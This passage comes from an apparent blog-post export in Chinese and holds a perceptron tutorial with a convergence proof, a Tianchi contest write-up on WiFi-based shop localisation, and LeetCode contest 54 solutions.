x_1} + b = 0\\\\ \\end{align} \\] 两式相减得： \\[ \\begin{align} {\\bf w^T (x_0 - x_1)} = 0\\\\ \\end{align} \\] 而\\(\\bf x_0 - x_1\\)是平面上的向量，而\\(\\bf x_0 - x_1\\)与w内积为0，因此，w就是法向量（垂直于平面内所有向量）。 感知机的分类示意图如下： perceptron 学习策略 那么，如何训练出感知机呢？ 我们需要有一个损失函数，这样我们才能不断的优化它，最后达到一个较为理想的值。 既然是分类问题，一个自然的选择是误分类点的总数（即0-1损失函数） \\[ l_{0-1}= \\begin{cases} 0&amp;f({\\bf x_i}) = y_i\\\\ 1&amp; f({\\bf x_i}) \\ne y_i \\end{cases} \\] 但是这个损失函数不是参数w,b的连续可导函数，不容易进行优化。 因此，感知机采用的是误分类点到超平面S的总距离。 设点\\(\\bf x_0\\)到超平面 \\({\\bf w^T x_0}+b = 0\\)的距离为d。\\(\\bf x_1\\)为平面上的任意一点，则\\(|\\!|{\\bf x_0} - {\\bf x_1}|\\!|\\)投影到\\(\\bf w\\)的距离为： \\[ \\begin{align} \\rm proj_w({\\bf x_0-x_1}) &amp;=|\\!|{\\bf x_0-x_1}|\\!|\\cdot |\\cos({\\bf w,x_0-x_1})| \\\\&amp;=|\\!|{\\bf x_0-x_1}|\\!|\\frac{|{\\bf w^T(\\bf x_0 - x_1)}|}{ {|\\!|{\\bf w}|\\!|\\ |\\!|\\bf x_0-x_1|\\!|} } \\\\&amp;=\\frac{|{\\bf w^T(\\bf x_0 - x_1)}|}{ {|\\!|{\\bf w}|\\!|} } \\\\&amp;=\\frac{|{\\bf w^T\\bf x_0 -w^Tx_1}|}{ {|\\!|{\\bf w}|\\!|} } \\\\&amp;=\\frac{|{\\bf w^T\\bf x_0} +b|}{ {|\\!|{\\bf w}|\\!|} } \\tag{2-1} \\end{align} \\] 式2-1即为点\\({\\bf x_0}\\)到超平面S的距离。 对于分类错误的样本\\(({\\bf x_i}, y_i)\\)有： \\[ y_i({\\bf w^T x_i}+ b) \\lt 0 \\] 因此，误分类点到平面的距离为： \\[ -\\frac{1}{|\\!|{\\bf w}|\\!|}y_i({\\bf w^T x_i}+ b） \\] 考虑所有的分类错误的点集合M，则所有误分类点到超平面S的总距离： \\[ -\\frac{1}{|\\!|{\\bf w}|\\!|}\\sum_{x_i\\in M}y_i({\\bf w^T x_i} + b） \\] 不考虑\\(\\frac{1}{||{\\bf w}||}\\)，就得到感知机的损失函数： \\[ \\begin{align*} L(w, b) &amp;= -\\sum_{x_i\\in M}y_i({\\bf w^T x_i}+ b), i = 1,2...,n\\\\ &amp;= \\sum_{i=1}^n\\max(0, -y_i({\\bf w^T x_i}+ b)) \\end{align*}\\tag{2-2} \\] 损失函数\\(L({\\bf w}, b)\\) 是非负的，若没有误分类点，则\\(L({\\bf w}, b)=0\\) PS: 为什么能不考虑\\(\\frac{1}{||{\\bf w}||}\\)呢？李航老师将\\(y_i({\\bf w^T x_i} + b)\\)称为函数间隔，而称\\(\\frac{1}{||{\\bf w}||}y_i({\\bf w^T x_i} + b)\\)为几何间隔。感知机省略了\\(\\frac{1}{||{\\bf w}||}\\)相当于是最小化函数间隔。后面会讲到SVM则是实实在在的几何间隔。几何间隔反应了点到超平面的垂直距离，而函数间隔则可以表示正确性以及分错的置信度。SVM想要鲁棒性(robust)强，因此采用最大化几何间隔。而感知机只想把所有的点都分对，只需要函数间隔即可。 梯度下降求解 由于L(w, b) 是w,b的连续可导函数，我们可以用随机梯度下降法进行求解。 \\[ \\begin{align*} \\frac{\\partial L({\\bf w}, b)}{\\partial {\\bf w} } &amp;= -\\sum_{x_i\\in M}y_i {\\bf x_i}\\\\ \\frac{\\partial L({\\bf w}, b)}{\\partial b} &amp;= -\\sum_{x_i\\in M}y_i \\end{align*} \\] 因此，感知机学习算法（Perceptron Learning Algorithm, PLA）如下(随机梯度下降)： 给定学习率\\(\\eta\\)，随机选取初值w, b 选取分类错误的数据 \\({\\bf x_i}, y_i\\)按下面的式子更新，直到没有错误为止 \\[ \\begin{aligned} {\\bf w} \\leftarrow&amp; {\\bf w} + \\eta y_i{\\bf x_i}\\\\ b \\leftarrow&amp; b + \\eta y_i \\end{aligned}\\tag{2-3} \\] 感知机选取不同的初值或选取不同的分类点，解可能不同。为了得到唯一的超平面，需要对分离超平面增加约束条件。（其实就是SVM的想法） 当数据集 线性可分 时（即存在一个超平面，能将数据集中正例负例正确的划分到超平面两侧），可以证明，感知机一定会收敛（即没有错误），在本小节最后给出相应的证明。 当线性不可分的时候，往往设定迭代次数。 一种几何解释 在台大的林轩田《机器学习基石》课程中，提到了这种修正方法： 对于分类错误的样本，有（把b放入了w，对应的x为1就得到）： \\[ {\\rm sign}({\\bf w^T x_i}) \\not =y_{i} \\] 有两种情况： y是+1，但是模型判断出来是负值。也就是说此时w与x之间的角度太大，因此需要把w往靠近x的方向旋转使它们的角度变小。可以通过\\({\\bf w} \\leftarrow {\\bf w} + y_i{\\bf x_i}\\)达到这个目的 y是-1，但是模型判断出来是正值。也就是说此时w与x之间的角度太小，因此需要把w往远离x的方向旋转使它们的角度变大。考虑到负号，其实也可以可以通过\\({\\bf w} \\leftarrow {\\bf w} + y_i{\\bf x_i}\\)达到这个目的 perceptron_learn_vector 感知机收敛证明 在收敛性证明中，我们感知机也使用\\(f({\\bf x}) = {\\rm sign}({\\bf w^T x_i})\\)的形式（为了方便描述，本文余下部分也用这种形式）。 设训练集\\(\\{({\\bf x_1}, y_1),({\\bf x_2}, y_2),\\cdots,({\\bf x_n}, y_n) \\}\\)是线性可分的，其中\\(\\ y_i\\in \\{+1,-1\\}\\)，则： 1. 存在满足\\(|\\!|w_{opt}|\\!|= 1\\)的超平面\\(\\bf w_{opt}^Tx\\)将数据集完全正确分开，且存在\\(\\gamma \\gt 0\\), 对于所有的\\(i =1,2, \\cdots,n\\)，有\\(y_i({\\bf w_{opt}^Tx_i }) \\ge \\gamma\\) 2. \\(R = \\max_{1\\le i \\le n} |\\!|x_i|\\!|\\), 则感知机在训练数据集上的误分类次数满足不等式\\(k \\le (\\frac{R}{\\gamma})^2\\) 对于第1点，由于训练集是线性可分的，根据线性可分的定义，必有超平面可将数据集正确分开。因此有\\(y_i{\\bf w_{opt}^Tx}\\gt 0\\)，所以存在\\(\\gamma =\\min_i \\{y_i({\\bf w_{opt}^Tx_i })\\}&gt;0\\)，使得\\(y_i{\\bf w_{opt}^Tx}\\ge \\gamma\\) 接下来证明第2点。 \\[ \\begin{align*} {\\bf w_{k}^Tw_{opt} } &amp;=({\\bf w_{k-1} } +\\eta y_i{\\bf x_i})^T{\\bf w_{opt} } \\\\ &amp;= {\\bf w_{k-1}^Tw_{opt} } +\\eta y_i{\\bf w_{opt}^Tx_i}\\\\ &amp;\\ge {\\bf w_{k-1}^Tw_{opt} } + \\eta\\gamma\\\\ &amp;\\ge {\\bf w_{k-2}^Tw_{opt} } +2\\eta\\gamma\\\\ &amp;\\ge k\\eta\\gamma \\hspace{10ex}\\tag{2-4} \\end{align*} \\] 式2-4最后是假设初始\\(w_0\\)是0向量。 又因为： \\[ \\begin{align*} |\\!|{\\bf w_{k}^T}|\\!|^2 &amp;= |\\!| {\\bf w_{k-1} } +\\eta y_i{\\bf x_i}|\\!|^2\\\\ &amp;= |\\!|{\\bf w_{k-1} }|\\!|^2+ |\\!|\\eta y_i{\\bf x_i}|\\!|^2 +{2\\eta y_i {\\bf w_{k-1}^Tx_i} }\\\\ &amp; \\le |\\!|{\\bf w_{k-1} }|\\!|^2+ \\eta^2|\\!|{\\bf x_i}|\\!|^2 \\hspace{5ex} y_i {\\bf w_{k-1}^Tx_i} \\le 0 \\ and \\ y_i^2 = 1\\\\ &amp; \\le k\\eta^2|\\!|{\\bf x_i}|\\!|^2\\\\ &amp; \\le k\\eta^2 R^2 \\hspace{17ex} R = \\max_{1\\le i \\le n} |\\!|x_i|\\!| \\tag{2-5} \\end{align*} \\] 又因为 \\[ \\underbrace{k\\eta\\gamma \\le {\\bf w_{k}^Tw_{opt} }}_{式2-4} \\le |\\!|{\\bf w_{k}^T}|\\!| \\underbrace{|\\!|{\\bf w_{opt} }|\\!|}_{1}=|\\!|{\\bf w_{k}^T}|\\!| \\le \\sqrt{k\\eta^2R^2} \\tag{2-6} \\] 因此有 \\[ (k\\eta\\gamma)^2 \\le k\\eta^2R^2 \\Rightarrow k \\le \\left(\\frac{R}{\\gamma}\\right)^2 \\tag{2-7} \\] 式2-7说明，感知机在在线性可分的数据集中训练，误分类次数k是有迭代上限的，经过有限次搜索可以找到将训练数据完全正确分开的超平面。 感知机的一些变形 前面提到了感知机的学习算法PLA，其可以容易的扩展到在线学习、批量学习、以及核函数形式。 在线学习 Online learning Online learning refers to the learning mode in which the model update is performed each time a single observation is received 在线学习即使用新观测到一条数据来更新模型。 回顾一下PLA，PLA是遍历数据，选一条分错的数据按2-3式进行更新。其实就是随机梯度下降法。这很容易扩展到在线学习中。给定一条新的数据，只要数据分错，那么继续按2-3式更新。 给定学习率\\(\\eta\\)，随机选取初值w 给定数据\\(({\\bf x_i},y_i)\\)，若\\(y_i \\ne sign({\\bf w^Tx_i})\\)按下面的式子更新 \\[ {\\bf w} \\leftarrow {\\bf w} + \\eta y_i{\\bf x_i} \\] 批量学习 Batch learning Batch learning performs model update after observing the whole training set. 批量学习一次使用整个数据集进行更新。 给定完整的数据集\\(\\{({\\bf x_1}, y_1),({\\bf x_2}, y_2),\\cdots,({\\bf x_n}, y_n) \\}\\)，学习率\\(\\eta\\)，随机选取初值w do \\(\\Delta\\leftarrow (0,0,\\cdots,0)\\) for i = 1 to N do \\(u_i \\leftarrow {\\bf w^T x_i}\\) \\(\\text{if } y_iu_i\\le0\\){ \\(\\Delta \\leftarrow\\Delta+ (- y_i{\\bf x_i})\\) ​ } ​ \\(\\Delta \\leftarrow \\Delta / n\\) ​ \\({\\bf w} \\leftarrow {\\bf w} - \\eta\\Delta\\) until \\(|\\Delta| \\lt \\epsilon\\) 核化感知机 如果你不知道核函数是什么，可以先看完我的SVM系列（尤其是深入理解SVM(二) – 核函数和软边距）后再来看该内容。 为了使用核方法，首先要将\\(\\bf w\\)用\\(\\bf x_i\\)线性表示。根据假设其初值为0，根据PLA算法，可以看出 \\[ {\\bf w} = \\sum_{i=1}^n\\alpha_iy_i{\\bf x_i} \\] 其中，\\(\\alpha_i= n_i\\eta\\)表示样本\\(x_i\\)被误分类的次数\\(n_i\\)乘以\\(\\eta\\)（每误分一次就要使用\\({\\bf w} \\leftarrow {\\bf w} + \\eta y_i{\\bf x_i}\\)更新一次） 因此，感知机可以写为 \\[ \\begin{align*} f({\\bf x}) &amp;= \\rm sign({\\bf w^Tx})\\\\ &amp;= \\rm sign(\\sum_{i=1}^n\\alpha_i{\\bf y_i{\\bf x_i}^Tx})\\\\ &amp; = \\rm sign(\\sum_{i=1}^n\\alpha_iK({\\bf x_i, x})) \\end{align*} \\] 其学习方式为: 给定学习率\\(\\eta\\)，\\(\\alpha_i = 0\\) 对于每个训练数据\\(({\\bf x_j},y_j)\\)，若\\(y_i \\ne sign(\\sum_{i=1}^n\\alpha_iK({\\bf x_i, x_j}))\\) 按下面的式子更新，直到达到迭代次数或满足终止条件： \\[ \\alpha_i \\leftarrow \\alpha_i + \\eta \\] 小结 感知机寻找超平面\\({\\bf w^T x}+b = 0\\) 来划分数据，采用\\(\\rm sign({\\bf w^T x}+b)\\)来判别正负类 感知机学习的目标函数定义是 误分类点到超平面S的总函数距离，即 \\[ \\begin{align*} L(w, b) &amp;= -\\sum_{x_i\\in M}y_i({\\bf w^T x_i}+ b）, i = 1,2...,n\\\\ &amp;= \\sum_{i=1}^n\\max(0, -y_i({\\bf w^T x_i}+ b)) \\end{align*} \\] 参考资料 《统计学习方法》 - 李航 机器学习基石 - 林轩田 Perceptron-CS534 Convergence Proof for the Perceptron Algorithm Kernel_perceptron","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"机器学习","slug":"study/机器学习","permalink":"https://www.hrwhisper.me/categories/study/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"},{"name":"Machine Learning model","slug":"Machine-Learning-model","permalink":"https://www.hrwhisper.me/tags/Machine-Learning-model/"}]},{"title":"天池比赛-商场中精确定位用户所在店铺","slug":"tianchi-contest-location-at-mall","date":"2018-02-17T15:04:53.000Z","updated":"2021-01-08T13:42:14.034Z","comments":true,"path":"tianchi-contest-location-at-mall/","link":"","permalink":"https://www.hrwhisper.me/tianchi-contest-location-at-mall/","excerpt":"第一次打天池的比赛（其实这比赛也是CCF的）~ 初赛排名 13 / 2845，复赛是平台赛，没怎么做","text":"第一次打天池的比赛（其实这比赛也是CCF的）~ 初赛排名 13 / 2845，复赛是平台赛，没怎么做 题目回顾 题目地址：商场中精确定位用户所在店铺 题目要求给定一条用户的消费记录，求该用户当前所在的店铺 下面介绍题目数据和评测方式 1. 店铺和商场信息表(mall) Field Type Description Note shop_id String 店铺ID 已脱敏 category_id String 店铺类型ID 共40种左右类型，已脱敏 longitude Double 店铺位置-经度 已脱敏，但相对距离依然可信 latitude Double 店铺位置-纬度 已脱敏，但相对距离依然可信 price Bigint 人均消费指数 从人均消费额脱敏而来，越高表示本店的人均消费额越高 mall_id String 店铺所在商场ID 已脱敏 部分样例如: shop_id category_id longitude latitude price mall_id s_26 c_4 122.3467 31.83351 57 m_690 s_133 c_6 121.1344 31.19751 58 m_6587 s_251 c_38 121.0005 30.90767 34 m_5892 s_372 c_30 119.865 26.65988 44 m_625 s_456 c_26 122.5942 31.5815 44 m_3839 2. 用户店铺内交易表(train) Field Type Description Note user_id String 用户ID 已脱敏 shop_id String 用户所在店铺ID 已脱敏。这里是用户当前所在的店铺，可以做训练的正样本。（此商场的所有其他店铺可以作为训练的负样本） time_stamp String 行为时间戳 粒度为10分钟级别。例如：2017-08-06 21:20 longitude Double 行为发生时位置-经度 已脱敏，但相对距离依然可信 latitude Double 行为发生时位置-纬度 已脱敏，但相对距离依然可信 wifi_infos String 行为发生时Wifi环境，包括bssid（wifi唯一识别码），signal（强度），flag（是否连接） 例子：b_6396480|-67|false;b_41124514|-86|false;b_28723327|-90|false;解释：以分号隔开的WIFI列表。对每个WIFI数据包含三项：b_6396480是脱敏后的bssid，-67是signal强度，数值越大表示信号越强，false表示当前用户没有连接此WIFI（true表示连接）。 前四行数据如下：（每一行为一条用户记录） user_id shop_id time_stamp longitude latitude wifi_infos u_376 s_2871718 2017/8/6 21:20 122.3083 32.08804 b_6396480|-67|false;b_41124514|-86|false;b_28723327|-90|false;b_6396479|-55|false;b_8764723|-90|false;b_32053319|-74|false;b_5857370|-68|false;b_56326644|-89|false;b_56328155|-77|false;b_5857369|-55|false u_376 s_2871718 2017/8/6 21:20 122.3082 32.08797 b_6396480|-67|false;b_56328155|-73|false;b_41124514|-88|false;b_56328154|-73|false;b_56326319|-84|false;b_32053319|-83|false;b_5857370|-68|false;b_6396479|-57|false;b_31100514|-89|false;b_5857369|-57|false u_1041 s_181637 2017/8/2 13:10 117.3653 40.63821 b_8006367|-78|false;b_2485110|-52|false;b_30058118|-69|false;b_8006442|-71|false;b_33503892|-56|false;b_33503917|-63|false;b_27390312|-72|false;b_8006521|-74|false;b_35013153|-56|false;b_37608251|-84|false u_1158 s_609470 2017/8/13 12:30 121.1345 31.19742 b_26250579|-73|false;b_26250580|-64|false;b_26250581|-64|false;b_26250516|-77|false;b_52934996|-79|false;b_26250593|-81|false;b_26250517|-76|false;b_30424471|-60|false;b_26250578|-72|false;b_29510856|-80|false 3. 评测集(test) 评测集和和表2差不多，只是把shop_id改为了mall_id 我们的模型需要预测出该数据每一行用户记录的shop_id，并进行提交。 比赛分为A B榜，A榜数据是9月份第一周数据，B榜数据是9月份第二周数据。 4. 评测方法 比赛的评测方法采用的是accuracy 比赛历程 开始做题的时候是10月21号。比赛已经开始了一周。 拿到这个赛题，第一个想法就是利用经纬度信息，首先水了个经纬度的KNN版本，准确率大概在0.66左右吧。太低。 然后把每条记录的wifi分开，看成一个个的词，类似于NLP中的BOW模型，展开，跑RandomForest多分类，然而内存炸了，果断分mall，就到了0.90。 加上经纬度特征就0.905。 挖到强特就是爽哈哈哈~ 要注意的是wifi强度是负数，我修正为正数了（直接+120）。 此时为了日后能方便的增删特征，尝试不同分类器，于是我重构了代码： 新特征只要继承XXToVec纯虚类，实现fit_transform 和transform结构就行（模仿sklearn的接口） 抽象测试类。ModelBase，可以设置使用什么分类器、保存模型。最棒的是关于特征只需要传一个list。如 123task = ModelTest(save_model=False, use_multiprocess=False, save_result_proba=True)vecs = [LocationToVec2(), WifiToVec(), WifiStrongToVec(), WifiKStrongToVec(), PriceToVec(), CategoryToVec2() ]task.train_test(vecs) 上述的代码使用vecs里的特征，就可以进行训练并评价。（内部就是遍历vecs，然后对每个vec直接调用fit_transform和transform即可） 我感觉我代码写的很好有了这个框架，之后挖特征写代码就很容易啦。非常松的耦合代码还不会乱七八糟的。 之后开始进行数据的查看，比如同一商场多个bssid如何处理，不同商场有同一个bssid。有的商场得分特别低画出雷达图查看可能是强度普遍偏弱照成的。 tianchi-wifi-position-wifi-frequency-count 然后画出了全部商场的location信息和各个商场中用户和商店的经纬度信息。下图是某mall的可视化结果： tianchi-wifi-position-wifi-frequency-count 圆形为商家自己提供的经纬度坐标。而三角形是交易发生时的经纬度。中间的矩形则是算出来的商场中心。可以看出，很多用户偏离商店非常远。这和室内GPS信号不好有很大关系。 看到这个我自然就想到要“修正”那些离群点。我的做法是： 如果一个用户a距离商店中心过远，超过商店的长度（用最远商店距离算）一定倍数，那么需要修正。通过wifi信号来计算最近的那个用户b，将b的经纬度写成a的即可。这个修正后有小幅提升。 然后联想到wifi空值处理，取最近经纬度用户的wifi来填充。 队友超超弄了个wifi强度和时间特征，只取最强的那个给我，然后我忘记加时间特征，一交0.9116，下午才发现要是加了时间特征反而更低。然后把wifi空值处理、经纬度修正加上去，立马升到了0.9139嘿嘿，上分美滋滋。 接着队友wqs调参成功，rf的个数400，0.9144。 原来都100的跑。。。 然后我去新中关还有欧美汇实地考察商场，哈哈哈，其实是去吃东西，顺便下了个APP记录wifi信息。 期间超超说做到了0.96，我问怎么做到的，就是他把训练数据中每一条记录对应的shop_id对应的类别作为特征，之后又把price也作为特征，到了0.99几乎全对。然而这个做法是错误的，因为测试数据不知道shop_id，因此也不知道每一条记录对应的category和price。但给我启发：假如我预测出category和price呢？会因为累积误差炸了么？ 预测类别一开始失败了，但是回归预测price成功了，提交price的特征版本线上0.9161. 接着看群里影帝的表演，从言语中观察他们应该用的是二分类的方法，于是我也做简单的尝试，采用OneVsRest，线上0.9175，线下0.915269. 这期间麦芽开源了多分类的xgboost版本的baseline，这个baseline线上0.91左右，方法和我们的类似，感觉药丸。 后面的追分真可怕。 然后超超发现bootstrap = false,再跑二分类 线上0.9196，线下0.9174。期间我在试stacking，以及 wifi的tf-idf特征、lightgbm（可能参数没有调好）、PCA等，但是都没啥用。去除了移动热点有小幅提升。然后为了提高代码效率，尝试并行化 data_to_vec和predict，但是Python GIL真是坑，线程不快，进程大量数据传输反而拖慢。然后用生产者、消费者模式加速data_to_vec和predict过程（predict的传递classifier内存会炸，服务器大内存会说太大之类的）。 感觉Python效率真的是卧槽。xgboost跑了几个grid search，太慢了都要放弃了。队友新特征也木有挖出有用的。 没办法了，我上融合把，稳住第一页，用的是比例融合的方式（rf, binary rf， binary xgboost），线上到了0.9234！ 这时候我又重新跑了十则的price和category，category终于有用，0.9243！ 然后期间还试二分类候选集的，效果不好。接着统计用户特征，做用户偏好，没有考虑冷启动问题，最简单的直接计数法。。。线上0.9264！ 这时候开始B榜了，被df的小哥骗了，说会自动抓取之前最好的A榜来计算B榜的。结果木有，浪费了一次机会。提交掉了快6个千，0.9207… 最后融了一个新的多分类xgboost，到了0.92115. 排名13 最后模型如下： 12models &#x3D; [&#39;random forest not price 0.9199&#39;, &#39;binary random forest not price 0.91998&#39;, &#39;binary xgb 0.9149&#39;,&#39;xgb 0.9123&#39;]weights &#x3D; [78, 80, 34, 5] # Mean: 0.9240684683620611 第二赛季就没怎么打了，线上赛用的PAI平台太坑了。。Create table都要十几分钟。资源限制太不合理了。都没法玩。。对hive也不熟，UDF也不会，分wifi都搞了半天，特征也限制列数不能超过1200好像。也就是BOW wifi会GG。最后水了各个mall取了wifi top 1000，加上经纬度，直接RF多分类，（ps: 用python生成的各个mall的代码）。排45名，挺差的，不过也不怎么在意。 冠军队的做法对比 候选集直接选取目标mall中所有的shop作为候选，为了避免训练集数据量过大，在训练集中进行样本抽样。具体方法是，保留全部正样本，负样本中随机抽取一定比例加入训练集。实际测试，抽样对于模型的精度影响不大。而预测的时候没有抽样，因为速度快。PS: 多分类用商店的特征得展开，二分类就不用。 训练集和测试集的构造方法图示如下： 训练： row_id 候选 特征 label 1 shop_1 … 1 1 shop_2 … 0 1 shop_3 … 0 2 shop_1 … 0 2 shop_2 … 1 2 shop_3 … 0 测试： row_id 候选 特征 输出概率 预测 3 shop_1 … 0.6 3 shop_2 … 0.8 3 shop_3 … 0.9 √ 4 shop_1 … 0.1 4 shop_2 … 0.9 √ 4 shop_3 … 0.2 特征的差异不说，多分类的输出概率作为二分类的特征。 复赛中不一样的，记录如下： 分离信号强度为null的数据。对于信号强度为null的那些数据，强度不论填成多少，对于模型都是个干扰。所以直接去除这一部分数据，用剩下的数据来训练。（我们没有排除。。。） 分区表存储训练数据。如果为每个mall都单独生成一张训练数据表，那么表会太多，而且不断的生成、删除表，会增加任务提交的排队时间。我们的解决方案是用分区表存储所有mall的训练数据，以mall_id作为分区列。模型训练时可以直接指定分区，这样避免了反复的生成表、删除表。 一点感想 第一次打数据挖掘的比赛，得了13名感觉还可以。初赛基本都保持在第一页，每次掉出第一页马上又能冲回去。 不过也犯了一些错误：比如线下的数据集划分不是很好，一开始直接排序取后20%作为验证集，其实最好还是按照线上的取最后一周这样比较好。特征感觉不够多啊。 还有模型的建立缺乏经验，本题确实多分类不如二分类的好。 这比赛学到了很多东西, 原来都木有用过xgboost，lightgbm，stacking等~ 比赛经验很重要，对业务理解很重要。前者可以看看别人的比赛的经验学习学习。这比赛中商家提供的经纬度某商场竟然有40多个一样的！ （这题给的经纬度精度都达到了分米的级别了！) 不可能49楼大商场把。。我也实地逛了几个商场，感觉是有那种移动的摊位，今天这个，明天那个。然后一开始拿到题目就想到了经纬度肯定有一样的，还想要把商店进行上下分层，为此采集了新中关和欧美汇部分商店的wifi信息。不过我没有时间实践这个想法了，队友后面也没啥激情做这比赛，放弃这想法挺可惜的。后面听经验分享觉得很有道理，不要太早组队，因为你不能确定你的队友到后面是不是很努力，已经组队了都不好意思踢，而且比较后面组队大家想法不太一样，模型融合起来也会比较好。 还有就是机器性能也很重要。实验室两台机器，女票那还有服务器，感觉美滋滋~ 还是要多学习才能更厉害~ 开源代码 我的代码： 天池-wifi定位","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"比赛","slug":"code/比赛","permalink":"https://www.hrwhisper.me/categories/code/%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"},{"name":"Data mining","slug":"Data-mining","permalink":"https://www.hrwhisper.me/tags/Data-mining/"},{"name":"天池","slug":"天池","permalink":"https://www.hrwhisper.me/tags/%E5%A4%A9%E6%B1%A0/"}]},{"title":"leetcode contest 54 solution","slug":"leetcode-contest-54-solution","date":"2017-10-15T14:07:04.000Z","updated":"2021-01-08T13:32:16.843Z","comments":true,"path":"leetcode-contest-54-solution/","link":"","permalink":"https://www.hrwhisper.me/leetcode-contest-54-solution/","excerpt":"本次题解包括 696. Count Binary Substrings 697. Degree of an Array 698. Partition to K Equal Sum Subsets 699. Falling Squares","text":"本次题解包括 696. Count Binary Substrings 697. Degree of an Array 698. Partition to K Equal Sum Subsets 699. Falling Squares 696. Count Binary Substrings Give a string s, count the number of non-empty (contiguous) substrings that have the same number of 0's and 1's, and all the 0's and all the 1's in these substrings are grouped consecutively. Substrings that occur multiple times are counted the number of times they occur. Example 1: 1234567Input: &quot;00110011&quot;Output: 6Explanation: There are 6 substrings that have equal number of consecutive 1&#39;s and 0&#39;s: &quot;0011&quot;, &quot;01&quot;, &quot;1100&quot;, &quot;10&quot;, &quot;0011&quot;, and &quot;01&quot;.Notice that some of these substrings repeat and are counted the number of times they occur.Also, &quot;00110011&quot; is not a valid substring because &lt;b&gt;all&lt;&#x2F;b&gt; the 0&#39;s (and 1&#39;s) are not grouped together. Example 2: 123Input: &quot;10101&quot;Output: 4Explanation: There are 4 substrings: &quot;10&quot;, &quot;01&quot;, &quot;10&quot;, &quot;01&quot; that have equal number of consecutive 1&#39;s and 0&#39;s. Note: s.length will be between 1 and 50,000. s will only consist of \"0\" or \"1\" characters. 题目地址：leetcode Count Binary Substrings 题目大意：给定只由0和1组成的字符串，求有多少个子串满足子串的连续的0和1的个数相等。 思路 我是区分0和1的区间，进行计数。如果当前的是1，cnt1&lt;=cnt0说明可以满足，ans++，当前是0同理。 Python 12345678910111213141516171819202122232425class Solution(object): def countBinarySubstrings(self, s): &quot;&quot;&quot; :type s: str :rtype: int &quot;&quot;&quot; if not s: return 0 ans = cnt0 = cnt1 = 0 first = s[0] for i, c in enumerate(s): if c != first: first = c if c == &#x27;1&#x27;: cnt1 = 0 else: cnt0 = 0 if c == &#x27;1&#x27;: cnt1 += 1 if cnt1 &lt;= cnt0: ans += 1 else: cnt0 += 1 if cnt0 &lt;= cnt1: ans += 1 return ans 697. Degree of an Array Given a non-empty array of non-negative integers nums, the degree of this array is defined as the maximum frequency of any one of its elements. Your task is to find the smallest possible length of a (contiguous) subarray of nums, that has the same degree as nums. Example 1: 1234567Input: [1, 2, 2, 3, 1]Output: 2Explanation:The input array has a degree of 2 because both elements 1 and 2 appear twice.Of the subarrays that have the same degree:[1, 2, 2, 3, 1], [1, 2, 2, 3], [2, 2, 3, 1], [1, 2, 2], [2, 2, 3], [2, 2]The shortest length is 2. So return 2. Example 2: 12Input: [1,2,2,3,1,4,2]Output: 6 Note: nums.length will be between 1 and 50,000. nums[i] will be an integer between 0 and 49,999. 题目地址：leetcode Degree of an Array 题目大意：一个数组的degree定义为元素出现最多的次数。求最短的字数组，使得子数组的degree等于原数组的degree 思路： 我直接Hash表水了。。 Python 1234567891011121314151617class Solution(object): def findShortestSubArray(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: int &quot;&quot;&quot; d = collections.defaultdict(list) degree = 0 for i, num in enumerate(nums): d[num].append(i) degree = max(degree, len(d[num])) ans = len(nums) for l in d.values(): if len(l) == degree: ans = min(ans,l[-1] - l[0] + 1) return ans 698. Partition to K Equal Sum Subsets Given an array of integers nums and a positive integer k, find whether it's possible to divide this array into knon-empty subsets whose sums are all equal. Example 1: 123Input: nums &#x3D; [4, 3, 2, 3, 5, 2, 1], k &#x3D; 4Output: TrueExplanation: It&#39;s possible to divide it into 4 subsets (5), (1, 4), (2,3), (2,3) with equal sums. Note: 1 &lt;= k &lt;= len(nums) &lt;= 16. 0 &lt; nums[i] &lt; 10000. 题目地址：leetcode Partition to K Equal Sum Subsets 题目大意：给定一个数组nums和数字k，求数组能否被分为k个子数组，使得k个子数组的和相等？ 思路： 首先判断是否可以：即总和能被k整除，并且数组中元素的最大值&lt;= sum /k。 然后DFS即可。 Java 1234567891011121314151617181920212223242526272829class Solution &#123; public boolean canPartitionKSubsets(int[] nums, int k) &#123; int sum = 0, max = Integer.MIN_VALUE; for (int num : nums)&#123; sum += num; max = Math.max(max,num); &#125; int target = sum / k; if (sum != target * k max &gt; target) return false; Arrays.sort(nums); boolean[] vis = new boolean[nums.length]; return dfs(0, nums, k, target, vis); &#125; private boolean dfs(int cur, int[] nums, int k, int target, boolean[] vis) &#123; if (cur &gt; target) return false; if (cur == target) &#123; cur = 0; if (--k == 0) return true; &#125; for (int i = nums.length - 1; i &gt;= 0; i--) &#123; if (vis[i] cur + nums[i] &gt; target) continue; vis[i] = true; if (dfs(cur + nums[i], nums, k, target, vis)) return true; vis[i] = false; &#125; return false; &#125;&#125; 699. Falling Squares On an infinite number line (x-axis), we drop given squares in the order they are given. The i-th square dropped (positions[i] = (left, side_length)) is a square with the left-most point being positions[i][0] and sidelength positions[i][1]. The square is dropped with the bottom edge parallel to the number line, and from a higher height than all currently landed squares. We wait for each square to stick before dropping the next. The squares are infinitely sticky on their bottom edge, and will remain fixed to any positive length surface they touch (either the number line or another square). Squares dropped adjacent to each other will not stick together prematurely. Return a list ans of heights. Each height ans[i] represents the current highest height of any square we have dropped, after dropping squares represented by positions[0], positions[1], ..., positions[i]. Example 1: 123Input: [[1, 2], [2, 3], [6, 1]]Output: [2, 5, 5]Explanation: After the first drop of positions[0] = [1, 2]: _aa _aa ------- The maximum height of any square is 2. After the second drop of positions[1] = [2, 3]: __aaa __aaa __aaa _aa__ _aa__ -------------- The maximum height of any square is 5. The larger square stays on top of the smaller square despite where its center of gravity is, because squares are infinitely sticky on their bottom edge. After the third drop of positions[1] = [6, 1]: __aaa __aaa __aaa _aa _aa___a -------------- The maximum height of any square is still 5. Thus, we return an answer of [2, 5, 5]. Example 2: 123Input: [[100, 100], [200, 100]]Output: [100, 100]Explanation: Adjacent squares don&#39;t get stuck prematurely - only their bottom edge can stick to surfaces. Note: 1 &lt;= positions.length &lt;= 1000. 1 &lt;= positions[0] &lt;= 10^8. 1 &lt;= positions[1] &lt;= 10^6. 题目地址：leetcode Falling Squares 